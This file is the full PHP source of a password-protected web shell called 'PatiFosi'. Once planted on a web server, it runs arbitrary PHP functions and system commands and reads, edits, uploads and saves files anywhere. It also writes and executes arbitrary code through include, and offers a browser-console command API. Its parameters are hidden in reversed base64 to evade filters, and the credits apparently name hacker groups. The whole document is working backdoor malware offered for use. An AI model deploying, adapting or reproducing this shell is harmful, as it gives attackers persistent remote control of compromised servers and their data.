<?php
error_reporting(0);
header("X-XSS-Protection: 0");
//config login
// localhost/patifosi.php?login=gans
$param = 'login';                             // login input
$pw    = 'e5e32f8c9a2e843080f5176871e8cd32'; // md5 password default = gans
$inDir = true;                             // true or false, to enable input dir
$out   = 'exit;';                         // string, not login
$enc   = true;                           // js must enabled, editor & upload not encoded
$img   = 'https://i.ibb.co/nn0TWhS/patifosi.gif';

// variable
$dirGet = $_GET['dir'];
$dirGET = $_GET['dir'];
$file   = $_GET['file'];
$func   = $_GET['func'];
$arg    = $_GET['arg'];
$mode   = $_GET['mode'];
$type   = $_GET['type'];
$pass   = $_GET[$param];
$md5    = md5("$_GET[$param]");
$host   = $_SERVER['HTTP_HOST'];
$uplto  = $_POST['uplto'];
$saveto = $_POST['saveto'];
$file   = $_POST['file'];
$sec    = $_GET['sec'];
$sc     = $_SERVER['SCRIPT_NAME'];

// decode
function dec($str){
    $str = base64_decode(strrev("$str"));
    return str_replace('=', '-', "$str");
}

if($enc == true && isset($dirGet)){
    $dirGet = dec($dirGet);
    $func   = dec($func);
    $arg    = dec($arg);
    $uplto  = dec($uplto);
    $saveto = dec($saveto);
    $file   = dec($file);
};

// login
if($md5 !== $pw){
    die("$out");
    exit;
}

// tq
$w = array("pescyte", "idbte4m", "javcode", "zerobyte", "idxSmg", "patiUndetektet", "date"=>"28 Mei 2018", "new date"=>"16 Mei 2020");
 // sorry for bad code //
// just for fun       //

// checked type
if($type){
  $typeChecked = "checked";
};

// checked iframe
if($sec){
  $cekSec = "checked";
};

// chdir
if($dirGet){
  chdir($dirGet);
};

// directory
$dirNow = getcwd();

// button encode
if($enc){
  $encButton = 'enc()';
}else{
  $encButton = '';
};

// upl dir
if($uplto){
  $uplto = $uplto;
}else{
  $uplto = $dirNow;
};

// save dir
if($saveto){
  $saveto = $saveto;
}else{
  $saveto = $dirNow;
};

// input dir
if($inDir){
  $inputDir = "<th style='display:inline-block'>dir<br><input autocomplete='off' class='encode' type='text' name='dir' value='$dirNow' placeholder='/var/www/html'> </th>";
} else {
  $Hidinput = "<input class='encode' type='hidden' name='dir' value='$dirNow'>";
};

// codemirror library in mode=edit
if($mode == edit){
  $codemirror = "
  <script src='//codemirror.net/lib/codemirror.js'></script>
  <link rel='stylesheet' href='//codemirror.net/lib/codemirror.css'>
  <script src='//codemirror.net/mode/javascript/javascript.js'></script>
  <link rel='stylesheet' href='//codemirror.net/theme/monokai.css'>
  <script src='//codemirror.net/addon/edit/matchbrackets.js'></script>
  ";
};

// ?mode=api
if($mode == api){
    $dirGet = dec($_GET['dir']);
    $func   = dec($_GET['func']);
    $arg    = dec($_GET['arg']);
    chdir($dirGet);
  if (function_exists($func)) {
        @die($func($arg));
      }else{
        echo 'failed';
      }
  exit;
}
$apiJs = "var dirNow = '$dirNow'; var func; var arg; var login = '$host$sc?$param=$pass'; var api = login+'&mode=api'; var reqDir = api+'&dir='+rev(btoa(dirNow)).replace('=', '-');

          clear();

          function dir(){
            console.log(dirNow);
          };

          function cd(a){
            dirNow = a;
            var b = rev(btoa(a)).replace('=', '-');
            reqDir = api+'&dir='+b
            console.log(dirNow);
          };

          function go(a){
          var xmlhttp = new XMLHttpRequest();
             xmlhttp.timeout = 600000;
              xmlhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                  console.log(this.responseText);
                }
              };

              xmlhttp.ontimeout = function (e) {
                console.log('time out');
            };

              xmlhttp.open('GET', a, true);
              xmlhttp.send();
          };" . '

          function clear(){
            console.clear();
            console.log("%cPatiFosi", "background:#ff6b81; color:#2f3542; font-size:30px; font-family: Arial, Helvetica, sans-serif;");
            console.log("dir()\t\t\t\t\t\/\/ show dir now\r\ncd(\"\/www\/html\/tmp\")\t\t\/\/ change dir\r\nrun(\"system\", \"ls\")\t\t\/\/ run command\r\nclear()");

          }' . "

          function run(f, n){
            f = rev(btoa(f)).replace('=', '-');
            n = rev(btoa(n)).replace('=', '-');
            l = reqDir+'&func='+f+'&arg='+n;
            go('//'+l);
          };
";


// ?mode=iframe
if($mode == iframe){
  die("<title>PatiFosi</title><link rel='icon' href='$img' type='image/gif'><iframe src='?$param=$pass&mode=command' style='position:fixed; top:0px; bottom:0px; right:0px; width: 100%; border: none; margin:0; padding:0; overflow: hidden; z-index:999999; height: 100%;'></iframe><script>function rev(str) {return str.split('').reverse().join('');}$apiJs</script>");
  exit;
}

// run code
if($_POST['run']){
    $code = $_POST['code'];

    if($_POST['tmp']){
        $tmp_file = dec($_POST['tmp']);
    }else{
        $tmp_file = tempnam(sys_get_temp_dir(), '');
    };

    if(file_put_contents("$tmp_file","$code")){
        $tmp_run = "<mark style='background: #ffffff'><a href='?$param=$pass&run=$tmp_file' target='_blank' style='color:#2ed573'> run click here</a> -> $tmp_file";
    }else{
    	$tmp_run = "<mark style='background: #ffffff'><a style='color:#ff4757'> failed saving tmp -> $tmp_file";
    };
};
if($_GET['run']){
    $runIn = $_GET['run'];
    include "$runIn";
    unlink($runIn);
    exit;
};

// header html
echo "<html>
<head>
<title>PatiFosi</title>
<link rel='icon' href='$img' type='image/gif'>
<style>
#clear { text-decoration: none; }
.shadow {
    -moz-box-shadow: 4px 5px 7px rgba(0, 0, 0,0.5);
    -webkit-box-shadow: 4px 5px 7px rgba(0, 0, 0, .5);
    box-shadow: 4px 5px 7px rgba(0, 0, 0, .5);
}
input { background-color: #ffffff; color: #2f3542; }
</style>
$codemirror
<script>
function rev(str) {
    return str.split('').reverse().join('');
}

function enc() {
    var x = document.getElementsByClassName('encode');
    var i;
    for (i = 0; i < x.length; i++) {
        x[i].value = rev(btoa(x[i].value)).replace('=', '-');
    }
}

function decFunc(){
	var i;
	var a = document.getElementById('funcList').options;
	var b = document.getElementById('funcList');
	var c = document.getElementById('func');

	for (i = 0; i < a.length; i++) {
	b.options[i].value = atob(rev(b.options[i].value).replace('-', '='));
	}
	c.setAttribute('onfocus', '')
}

function isiArg(){
	var a = document.getElementById('func').value;
	var b = document.getElementById('arg');
	var c = document.getElementById('funcList');

	if (a == c.options[0].value) {
		b.value = '123';
	} else if (a == c.options[1].value) {
		b.value = '/';
	} else if (a == c.options[5].value) {
    b.value = '.';
  } else if (a == c.options[2].value || a == c.options[3].value || a == c.options[4].value) {
		b.value = 'ls';
	} else if (a == c.options[6].value) {
		b.value = '*.html';
	} else if (a == c.options[7].value || a == c.options[8].value || a == c.options[9].value || a == c.options[10].value || a == c.options[11].value || a == c.options[13].value) {
		b.value = 'file.php';
	} else if (a == c.options[12].value) {
		b.value = 'new';
	}
}

$apiJs
</script>
</head>

<body style='padding:5%; padding-top:2%; border: 3px solid #2f3542; font-family: Arial, Helvetica, sans-serif; background:#f1f2f6;'>
  <datalist id='funcList'>
    <option value='-=wbm5WawhGc'>
    <option value='-=QZjFGcz9FbhR3b091azlGZ'>
    <option value='tVGdzl3c'>
    <option value='-UncoR3czFGc'>
    <option value='-=wYlhXZfxGblh2c'>
    <option value='-=gcpRmbhN2c'>
    <option value='-=gYvx2Z'>
    <option value='MHduVGdu92YfRXZn9VZslmZ'>
    <option value='-UGbpZGZhVmc'>
    <option value='-UGbpZ2X0h2ZpxGanlGa'>
    <option value='-=QZslmZ'>
    <option value='r5Was5Wd'>
    <option value='-IXaktWb'>
    <option value='-g2Y19Gd'>
  </datalist>
  
<center><h1 style='color:#2f3542'>PatiFosi</h1></center>
<a style='font-size:10; color:#ff4757'>$host</a>
<a style='font-size:10; color:#a4b0be'>@</a>
<a style='font-size:10; color:#2f3542'>$dirNow</a>
<a style='font-size:10; color:#ff4757' href='?$param=$pass'>[Home]</a><center>
<div style='background-color: #ff6b81'>
<a id='clear' style='color:#2f3542' href='?$param=$pass&mode=command&dir=$dirGET'>[command] - </a>
<a id='clear' style='color:#2f3542' href='?$param=$pass&mode=edit&dir=$dirGET'>[edit] - </a>
<a id='clear' style='color:#2f3542' href='?$param=$pass&mode=about&dir=$dirGET'>[about] </a>
</div>
<br><br>
";


// mode command
if ($mode == "command") {
  $arg2 = htmlspecialchars($arg, ENT_QUOTES, 'UTF-8');
  echo " <form  method='get' autocomplete='off'>
      <table id='clear' style='text-align:center'>
          <input type='hidden' name='$param' value='$pass'>
          <input type='hidden' name='mode' value='command'>
          $Hidinput
          <tr>
            <th style='display:inline-block'>iframe<br><input type='checkbox' name='sec' value='y' $cekSec> </th>
          $inputDir
            <th style='display:inline-block'>func<br><input oninput='isiArg()' id='func' onfocus='decFunc()' list='funcList'  class='encode' type='text' name='func' value='$func' placeholder='system'> </th>
            <th style='display:inline-block'>arg<br><input id='arg' class='encode' type='text' name='arg' value='$arg2' placeholder='ls'>  </th> 
            <td><br><input type='checkbox' name='type' value='checked' $typeChecked >array   <input onclick='$encButton' type='submit' value='Submit' style='background-color: #57606f;color: #f1f2f6;'>
          </td>
          </tr>
        </table>
      </form>
      </center><br>
      <pre style='background:#dfe4ea; color: #2f3542; border-right: 6px solid #ced6e0;'>";
      
          if($type == 'checked'){
          echo "<i>var_dump($func($arg));</i><br>";
			if (function_exists($func)) {
				if($sec == 'y'){
					ob_start();
					@var_dump($func($arg));
					$run = ob_get_clean();
					echo("</pre><iframe class='shadow' style='border:none'  width='100%' height='100%' src='data:text/html;base64," . base64_encode($run) . "'></iframe>");
				} else {
				@var_dump($func($arg));
				}
			}
        } else {
			if (function_exists($func)) {
					if($sec == 'y'){
					ob_start();
					echo($func($arg));
					$run = ob_get_clean();
					echo "<i>echo($func($arg));</i><br>";
					echo("</pre><iframe class='shadow' style='border:none'  width='100%' height='100%' src='data:text/html;base64," . base64_encode($run) . "'></iframe>");
				} else {
				echo "<i>die($func($arg));</i><br>";
				@die($func($arg));
				}
			}
        }


// mode edit
  } elseif ($mode == "edit") {
      $arg2 = htmlspecialchars($arg, ENT_QUOTES, 'UTF-8');
      echo "
      
      <form  method='get'>
      <table id='clear' style='text-align:center'>
          <input type='hidden' name='$param' value='$pass'>
          <input type='hidden' name='mode' value='edit'>
          $Hidinput
          <tr>
          $inputDir
            <th style='display:inline-block'>func<br><input oninput='isiArg()' id='func' onfocus='decFunc()' list='funcList'  autocomplete='off' class='encode' type='text' name='func' value='$func' placeholder='readfile'> </th>
            <th style='display:inline-block'>arg<br><input id='arg' autocomplete='off' class='encode' type='text' name='arg' value='$arg2' placeholder='file.php'>  </th> 
            <td><br><input type='checkbox' name='type' value='ob' $typeChecked>ob   <input onclick='$encButton' type='submit' value='Submit' style='background-color: #57606f;color: #f1f2f6;'>
          </td>
          </tr>
        </table>
      </form></center>
      <div align='right'>
      <button class='shadow' type='button' onclick='fullN()' style='border-radius: 50%; border: none; background-color: #eccc68; color: #f1f2f6; text-align:right'>_</button>
      <button class='shadow' type='button' onclick='full()' style='border-radius: 50%; border: none; background-color: #2ed573; color: #f1f2f6; text-align:right'>_</button>
      <button class='shadow' type='button' onclick='reset()' style='border-radius: 50%; border: none; background-color: #ff4757; color: #f1f2f6; text-align:right'>_</button>
      <br></div>
      <form  method='post' action='?$param=$pass&mode=edit&dir=$dirGET&type=$type' enctype='multipart/form-data'>
      <div class='shadow'><textarea id='codemirror' name='code' style='width:100%; height: 50%;'>";
   // codemirror
      if(!empty($_GET['func']) && !empty($_GET['arg'])){
        if($_GET['type'] !== 'ob'){
          echo(htmlspecialchars($func($arg)));
        } else {
          ob_start();
          htmlspecialchars($func($arg));
          $run = ob_get_clean();
          echo(htmlspecialchars($run));
        };
      }elseif($_POST['code']){
        echo(htmlspecialchars($_POST['code']));
      };

      echo "</textarea></div><br><input type='hidden' name='tmp' class='encode' value='$tmp_file'><input onclick='$encButton' type='submit' name='run' value='run >>' style='background-color: #747d8c;color: #f1f2f6; float: right;'>

    <table style='width:100%'>
    <tr style='text-align:center'>
    <th style='display:inline-block; padding-right:10%; padding-left:10%;'>upload<br><input autocomplete='off' class='encode' type='text' name='uplto' value='$uplto' placeholder='$dirNow'><br><input type='file' name='datupload' style='border: 1px solid #dfe4ea; background:#f1f2f6;'><br><input onclick='$encButton' type='submit' name='uploadsubmit' value='upload' style='background-color: #57606f;color: #f1f2f6;'>
    </th>
    <th style='display:inline-block; padding-left:10%; padding-right:10%;'>save<br><input autocomplete='off' class='encode' type='text' name='saveto' value='$saveto' placeholder='$dirNow'><br><input autocomplete='off' class='encode' type='text' name='file' value='$file' placeholder='file.php'><br><input onclick='$encButton' type='submit' name='savesubmit' value='save' style='background-color: #57606f;color: #f1f2f6;'>
    </form></th>
    </tr>
    </table>
    <script>
        var myCodeMirror = CodeMirror.fromTextArea(document.getElementById('codemirror'), {
            theme: 'monokai',
            lineNumbers: true,
            matchBrackets: true,
            mode: 'javascript',
            viewportMargin: false,
        });

        function full(){
          myCodeMirror.setSize('100%', '100%');
        }

        function fullN(){
          myCodeMirror.setSize('100%', '60%');
        }

        function reset() {
            var txt;
            if (confirm('Ar u sure wanna reset d code?')) {
                myCodeMirror.setValue('');
            }
        }
    </script>
    ";
    echo "<center><hr style='border-top: 1px solid #dfe4ea' width='90%'><h4>";
    if(isset($_POST['savesubmit'])){
      if(!chdir($saveto)){
        die("<mark style='background: #ffffff'><a style='color:#ff4757'> directory not exist -> $saveto");
      };

      $fpc = 'file_p' . 'ut_contents';
      $write = $fpc($file, $_POST['code']);
		  if($write) {
			  die("<mark style='background: #ffffff'><a style='color:#2ed573'> saved -> $file");
		  } else {
			  die("<mark style='background: #ffffff'><a style='color:#ff4757'> failed save -> $file");
      }

    } elseif(isset($_POST['uploadsubmit'])){
      if(!chdir($uplto)){
        die("<mark style='background: #ffffff'><a style='color:#ff4757'> directory not exist -> $uplto");
      };

      $uploadname = $_FILES['datupload']['name'];
      $uploadtmp = $_FILES['datupload']['tmp_name'];
      $write = copy($uploadtmp, $uploadname);
      if($write) {
			  die("<mark style='background: #ffffff'><a style='color:#2ed573'> uploaded -> $uploadname");
		  } else {
			  die("<mark style='background: #ffffff'><a style='color:#ff4757'> failed upload -> $uploadname");
		  }
    } elseif($tmp_run){
        die("$tmp_run");
    };


// mode about
  } elseif ($mode == "about") {
    echo '</center><pre style="background:#dfe4ea; color: #2f3542; border-right: 6px solid #ced6e0;"><i>var_dump($w);</i><br>';
    echo var_dump($w);
  } else {
      echo "<img src='$img'><br>what ar u doin?<br>dont forget to open <b>console.log<b><br><br><a style='font-size:10; color:#ff4757' href='?$param=$pass&mode=iframe'>[Go to iframe mode]</a>
      <noscript><i>javascript isn't running</i></noscript><script>
      if(!navigator.onLine) {
        alert('u must connect internet for best experience');
      }
      </script>";
};
